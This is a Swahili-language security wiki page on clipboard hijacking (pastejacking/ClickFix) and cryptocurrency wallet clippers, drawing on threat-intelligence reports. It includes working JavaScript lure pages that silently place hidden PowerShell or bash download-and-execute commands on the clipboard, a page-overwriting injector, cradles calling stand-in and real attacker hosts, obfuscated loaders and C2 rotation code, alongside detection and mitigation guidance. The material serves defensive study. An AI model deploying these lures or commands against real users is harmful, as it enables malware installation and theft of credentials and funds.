# Mashambulizi ya Clipboard Hijacking (Pastejacking)

> "Usibandike kamwe kitu ambacho hukukinakili wewe mwenyewe." – ushauri wa zamani lakini bado halali

## Muhtasari

Clipboard hijacking – pia inajulikana kama *pastejacking* – hutumia vibaya ukweli kwamba watumiaji mara kwa mara hunakili na kubandika commands bila kuzikagua. Ukurasa hasidi wa wavuti (au mazingira yoyote yenye uwezo wa JavaScript kama vile programu ya Electron au Desktop) huweka kimfumo maandishi yanayodhibitiwa na mshambuliaji kwenye system clipboard. Waathiriwa hushawishiwa, kwa kawaida kupitia maelekezo yaliyoundwa kwa uangalifu ya social engineering, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *kubandika* yaliyomo kwenye clipboard, na hivyo kutekeleza commands kiholela mara moja.

Kwa sababu **hakuna file linalopakuliwa na hakuna attachment linalofunguliwa**, mbinu hii hupita vidhibiti vingi vya usalama vya e-mail na maudhui ya wavuti vinavyofuatilia attachments, macros au command execution ya moja kwa moja. Kwa hiyo, shambulizi hili ni maarufu katika kampeni za phishing zinazosambaza familia za malware za kawaida kama vile NetSupport RAT, Latrodectus loader au Lumma Stealer.<sup>[[1]](#references)</sup>

## Clippers za kubadilisha anwani za wallet

Aina nyingine ya **clipboard hijacking** haiweki commands kabisa: husubiri hadi mwathiriwa anakinakili **anwani ya cryptocurrency wallet**, kisha huibadilisha kimyakimya na kuweka ya mshambuliaji kabla tu ya kubandika. Hii huwa na ufanisi hasa dhidi ya miundo mirefu ya wallet kwa sababu watumiaji mara nyingi huthibitisha tu herufi za mwanzo/mwisho.<sup>[[8]](#references)</sup>

Sifa za kawaida zinazoonekana katika matukio halisi:
- **Thin loader + nested payload**: app/exe inayoonekana huonekana kama tool halali ya trading au ya "profit", huku clipper halisi ikiwa imefichwa ndani zaidi ya bundle (kwa mfano .NET loader inayoanzisha payload ya Rust iliyowekwa ndani).
- **Regex-driven replacement**: malware hulinganisha strings kama `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, au hata strings za jumla zenye **herufi 44 zinazofanana na Solana**, kisha huzibadilisha na wallet za mshambuliaji.
- **Wallet rotation at scale**: samples za kisasa za Windows zinaweza kuwa na **maelfu** ya wallet za kubadilishia kwa kila currency badala ya anwani moja tuli, hivyo kupunguza kuharibika kwa reputation ya wallet baada ya kila wizi.<sup>[[8]](#references)</sup>

### Mtiririko wa Windows clipper

Utekelezaji wa kawaida ni window iliyofichwa iliyosajiliwa kwa kutumia **`AddClipboardFormatListener`**. Kila clipboard inaposasishwa, malware kwa kawaida huita:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → kufikia data ya sasa ya clipboard.
- **`GetClipboardData`** → kusoma maandishi.
- **`EmptyClipboard`** + **`SetClipboardData`** → kubadilisha string ya wallet na value ya mshambuliaji.

Regex ndogo za hunting zinazoonekana mara kwa mara kwenye clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Persistence ya kiwango cha mtumiaji inatosha kuleta athari. Muundo mmoja ulioonekana ni:<sup>[[8]](#references)</sup>
- Nakili payload hadi **`%APPDATA%\silke\silke.exe`**
- Unda **Startup-folder LNK** chini ya `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Mawazo ya detection:
- Processes zinazoita clipboard APIs mfululizo huku pia zikiandika chini ya `%APPDATA%` na folda ya mtumiaji ya **Startup**.
- Uundaji mpya wa LNK/executable unaofuatwa na mabadiliko ya clipboard ya wallet-address.
- Archives au fake-software bundles zilizo na files nyingi zisizotumika pamoja na launcher ndogo inayoanzisha binary iliyo ndani ya nested.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Kwenye macOS, baadhi ya campaigns husambaza helper ya **`unlocker.command`** na kumwelekeza victim kubofya kulia → **Open** ikiwa Gatekeeper inasema app imeharibika au imetoka kwa developer asiyejulikana. Script hiyo huondoa quarantine na kuanzisha `.app` iliyo karibu:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Hii **si exploit ya Gatekeeper**; ni **ujanja wa kijamii wa kukwepa quarantine** unaotumia ukweli kwamba maamuzi ya Gatekeeper hutegemea xattr ya `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Baada ya kutekelezwa, clipper inaweza kujidumisha kama mtumiaji wa sasa kwa kuandika:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script ya wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent yenye `RunAtLoad` na `KeepAlive`

Maelezo muhimu ya kiulinzi ni kwamba baadhi ya samples hutumia **watchdog inayojirekebisha** ambayo huandika tena LaunchAgent na wrapper kila baada ya takriban sekunde 30. Ukiondoa plist kwanza **bila kuua mchakato unaoendelea**, malware inaweza kuiunda tena mara moja.<sup>[[8]](#references)</sup> Mpangilio salama wa kusafisha:
1. Ua mchakato unaotumika wa clipper.
2. Ondoa kwenye mfumo/futa plist ya LaunchAgent.
3. Futa `~/launch.sh` na payload iliyonakiliwa.

### Maelezo ya usambazaji: sifa bandia kama kizidishi cha nguvu

Kwa familia hii, malware yenyewe inaweza kubaki rahisi kitaalamu huku **tabaka la usambazaji** likifanya kazi kubwa: nyota/forks bandia za GitHub, reviews/downloads za SourceForge, maoni/views za tutorials za YouTube, na comments/votes zinazoonekana salama za VirusTotal hutumiwa kufanya binary ionekane ya kuaminika kabla ya kutekelezwa.<sup>[[8]](#references)</sup>

## Vitufe vya kulazimisha kunakili na payload zilizofichwa (macOS one-liners)

Baadhi ya infostealers za macOS huiga tovuti za installers (kwa mfano, Homebrew) na **kulazimisha matumizi ya kitufe cha “Copy”** ili watumiaji wasiweze kuchagua tu maandishi yanayoonekana. Ingizo la clipboard huwa na command inayotarajiwa ya installer pamoja na payload ya Base64 iliyoongezwa (kwa mfano, `...; echo <b64> | base64 -d | sh`), hivyo paste moja hutekeleza vyote viwili huku UI ikificha hatua ya ziada.<sup>[[5]](#references)</sup>

## Uthibitisho wa Dhana wa JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Kampeni za zamani zilitumia `document.execCommand('copy')`, huku mpya zikitegemea **Clipboard API** ya asynchronous (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Mtiririko wa ClickFix / ClearFake

1. Mtumiaji anatembelea tovuti yenye typosquatting au tovuti iliyoathiriwa (kwa mfano, `docusign.sa[.]com`)
2. JavaScript ya **ClearFake** iliyodungwa huita helper ya `unsecuredCopyToClipboard()` ambayo huhifadhi kwa siri one-liner ya PowerShell iliyosimbwa kwa Base64 kwenye clipboard.
3. Maelekezo ya HTML humwambia mwathiriwa: *“Bonyeza **Win + R**, bandika command hiyo kisha bonyeza Enter ili kutatua tatizo.”*
4. `powershell.exe` hutekeleza command, ikipakua archive iliyo na executable halali pamoja na DLL hasidi (DLL sideloading ya kawaida).
5. Loader hufungua stages za ziada, hudunga shellcode na kuweka persistence (kwa mfano scheduled task) – hatimaye ikiendesha NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Mfano wa Chain ya NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart halali) hutafuta `msvcp140.dll` kwenye saraka yake.
* DLL hasidi hutatua APIs kwa kutumia **GetProcAddress**, hupakua binaries mbili (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, huzifungua kwa kutumia rolling XOR key `"https://google.com/"`, hudunga shellcode ya mwisho na kufungua **client32.exe** (NetSupport RAT) kwenye `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Inapakua `la.txt` kwa kutumia **curl.exe**
2. Inatekeleza JScript downloader ndani ya **cscript.exe**
3. Inachota MSI payload → inaweka `libcef.dll` kando ya application iliyosainiwa → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer kupitia MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Simu ya **mshta** huzindua script ya PowerShell iliyofichwa ambayo hupakua `PartyContinued.exe`, hutoa `Boat.pst` (CAB), huunda upya `AutoIt3.exe` kupitia `extrac32` na uunganishaji wa faili, na hatimaye huendesha script ya `.a3x` inayotoa credentials za browser kwenda `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK yenye C2 inayobadilika (PureHVNC)

Baadhi ya kampeni za ClickFix huruka kabisa upakuaji wa faili na kuwaelekeza waathiriwa kubandika one-liner inayopakua na kutekeleza JavaScript kupitia WSH, kuiweka kwa persistence, na kubadilisha C2 kila siku. Mlolongo ulioonekana ni:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sifa kuu
- URL iliyofichwa hubadilishwa mwelekeo wakati wa utekelezaji ili kuzuia ukaguzi wa haraka.
- JavaScript hujiendeleza kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa – hivyo kuwezesha mzunguko wa haraka wa domain.<sup>[[3]](#references)</sup>

Kipande kidogo cha JS kinachotumika kuzungusha C2 kulingana na tarehe:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Hatua inayofuata kwa kawaida hu-deploy loader inayoweka persistence na kuvuta RAT (mfano, PureHVNC), mara nyingi ikifunga TLS kwenye certificate iliyowekwa hardcoded na kugawa traffic katika vipande.<sup>[[3]](#references)</sup>

Mawazo ya detection mahususi kwa variant hii
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (au `cscript.exe`).
- Startup artifacts: LNK ndani ya `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` inayoita WScript/CScript ikiwa na JS path chini ya `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU na command-line telemetry yenye `.split('').reverse().join('')` au `eval(a.responseText)`.
- `powershell -NoProfile -NonInteractive -Command -` zinazorudiwa zikiwa na payloads kubwa za stdin ili kuingiza scripts ndefu bila command lines ndefu.
- Scheduled Tasks ambazo baadaye hu-execute LOLBins kama `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` chini ya task/path inayoonekana kama ya updater (mfano, `\GoogleSystem\GoogleUpdater`).

Uwindaji wa vitisho
- C2 hostnames na URLs zinazobadilika kila siku zikiwa na pattern ya `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlate clipboard write events zinazofuatwa na Win+R paste kisha execution ya mara moja ya `powershell.exe`.

Blue-teams zinaweza kuchanganya clipboard, process-creation na registry telemetry ili kubaini matumizi mabaya ya pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` huhifadhi history ya commands za **Win + R** – tafuta entries zisizo za kawaida za Base64 / obfuscated.
* Security Event ID **4688** (Process Creation) ambapo `ParentImage` == `explorer.exe` na `NewProcessName` iko katika { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** kwa file creations chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au temporary folders muda mfupi kabla ya 4688 event yenye mashaka.
* EDR clipboard sensors (ikiwa zinapatikana) – correlate `Clipboard Write` inayofuatwa mara moja na PowerShell process mpya.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campaigns za hivi karibuni huzalisha kwa wingi fake CDN/browser verification pages ("Just a moment…", za mtindo wa IUAM) zinazowashawishi watumiaji kunakili commands mahususi za OS kutoka kwenye clipboard na kuziingiza kwenye native consoles. Hii huhamisha execution kutoka kwenye browser sandbox na hufanya kazi kwenye Windows na macOS.<sup>[[4]](#references)</sup>

Sifa kuu za pages zilizotengenezwa na builder
- OS detection kupitia `navigator.userAgent` ili kurekebisha payloads (Windows PowerShell/CMD dhidi ya macOS Terminal). Decoys/no-ops za hiari kwa OS zisizotumika ili kudumisha udanganyifu.
- Automatic clipboard-copy wakati wa vitendo visivyo na madhara vya UI (checkbox/Copy), huku text inayoonekana inaweza kutofautiana na content ya clipboard.
- Mobile blocking na popover yenye maelekezo ya hatua kwa hatua: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Obfuscation ya hiari na single-file injector ya kubadilisha DOM ya site iliyo-compromised kwa verification UI iliyostyled na Tailwind (hakuna usajili wa domain mpya unaohitajika).<sup>[[4]](#references)</sup>

Mfano: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Uendelevu wa macOS wa uendeshaji wa awali
- Tumia `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ili utekelezaji uendelee baada ya terminal kufungwa, hivyo kupunguza mabaki yanayoonekana.<sup>[[4]](#references)</sup>

Utekaji wa ukurasa uliopo kwenye tovuti zilizoathirika
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Mawazo ya detection na hunting maalum kwa lures za mtindo wa IUAM
- Web: Pages zinazofunga Clipboard API kwenye verification widgets; kutolingana kati ya text inayoonyeshwa na clipboard payload; branching ya `navigator.userAgent`; Tailwind + single-page replace katika mazingira yanayotiliwa shaka.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` muda mfupi baada ya browser interaction; batch/MSI installers zinazoendeshwa kutoka `%TEMP%`.
- macOS endpoint: Terminal/iTerm zinazo-spawn `bash`/`curl`/`base64 -d` zikiwa na `nohup` karibu na browser events; background jobs zinazoendelea baada ya kufungwa kwa terminal.
- Correlate historia ya `RunMRU` Win+R na clipboard writes pamoja na uundaji unaofuata wa console process.

Tazama pia kwa supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mageuzi ya 2026 ya fake CAPTCHA / ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake inaendelea ku-compromise WordPress sites na ku-inject loader JavaScript inayounganisha external hosts (Cloudflare Workers, GitHub/jsDelivr) na hata blockchain “etherhiding” calls (kwa mfano, POSTs kwenda Binance Smart Chain API endpoints kama `bsc-testnet.drpc[.]org`) ili kuvuta lure logic ya sasa. Overlays za hivi karibuni zinatumia sana fake CAPTCHAs zinazowaelekeza users kufanya copy/paste ya one-liner (T1204.004) badala ya kupakua kitu chochote.<sup>[[6]](#references)</sup>
- Initial execution inazidi kukabidhiwa signed script hosts/LOLBAS. Chains za Januari 2026 zilibadilisha matumizi ya awali ya `mshta` na `SyncAppvPublishingServer.vbs` iliyojengwa ndani, ikiendeshwa kupitia `WScript.exe`, huku ikipitisha arguments zinazofanana na PowerShell zenye aliases/wildcards ili kuvuta remote content:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imesainiwa na kwa kawaida hutumiwa na App-V; ikiambatanishwa na `WScript.exe` na arguments zisizo za kawaida (aliases za `gal`/`gcm`, cmdlets zilizo na wildcard, URLs za jsDelivr) huwa hatua ya LOLBAS yenye signal kubwa kwa ClearFake.<sup>[[6]](#references)</sup>
- Februari 2026, payloads za CAPTCHA za uongo zilirudi kwenye download cradles safi za PowerShell. Mifano miwili iliyo hai:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Chain ya kwanza ni grabber ya `iex(irm ...)` iliyo in-memory; ya pili huweka hatua kupitia `WinHttp.WinHttpRequest.5.1`, huandika `.ps1` ya muda, kisha huianzisha kwa `-ep bypass` katika dirisha lililofichwa.<sup>[[6]](#references)</sup>

Vidokezo vya detection/hunting kwa variants hizi
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` au PowerShell cradles mara moja baada ya clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, au raw IP `iex(irm ...)` patterns.
- Network: outbound kuelekea CDN worker hosts au blockchain RPC endpoints kutoka script hosts/PowerShell muda mfupi baada ya web browsing.
- File/registry: uundaji wa `.ps1` ya muda chini ya `%TEMP%` pamoja na RunMRU entries zenye one-liners hizi; block/alert kwenye signed-script LOLBAS (WScript/cscript/mshta) zinazo-execute zikiwa na external URLs au obfuscated alias strings.

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, na LOLBin chaining

Recent Red Canary telemetry inaonyesha kwamba indicator thabiti ni **si command moja mahususi**, bali mchanganyiko wa **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, na **immediate execution**.<sup>[[7]](#references)</sup>

### Miundo mashuhuri ya operator

- **Paste confirmation telemetry**: baadhi ya payloads huita `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` kabla ya stage halisi. Hii huthibitisha user interaction huku ikiweka window fupi na tulivu.
- **Fake verification comments**: PowerShell one-liners zinaweza kuongeza strings kama `# Security check ✔️ I'm not a robot Verification ID: 138105` ili command bado ionekane inahusiana na CAPTCHA baada ya kubandikwa kwenye Run / `cmd.exe` / PowerShell history.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` huepuka static URL kwenye command line huku ikiendelea kufanya in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` hutumia unusual casing na Unicode-like characters kwenye flags kuvuruga detections zisizo imara huku ikiendelea kufanana na `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` inaweza kuficha keywords kwa `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), kuanzisha nested shell ikiwa minimized, kuhifadhi attacker content kwa benign extension kama `.pdf`, kisha kui-execute kupitia `mshta`.<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – zima clipboard write-access (`dom.events.asyncClipboard.clipboardItem` n.k.) au hitaji user gesture.
2. Security awareness – wafundishe users ku-*type* sensitive commands au wayabandike kwanza kwenye text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ili kuzuia arbitrary one-liners.
4. Network controls – zuia outbound requests kuelekea pastejacking na malware C2 domains zinazojulikana.

## Related Tricks

* **Discord Invite Hijacking** mara nyingi hutumia ClickFix approach hiyo hiyo baada ya kuwavuta users kwenye malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Kurekebisha Click: Kuzuia ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Chini ya Pure Curtain: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Kiwanda cha ClickFix: Ufunuo wa Kwanza wa IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: Februari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: Juni 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Kutoka Stars hadi Upvotes: Fake Reputation Inayochochea Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
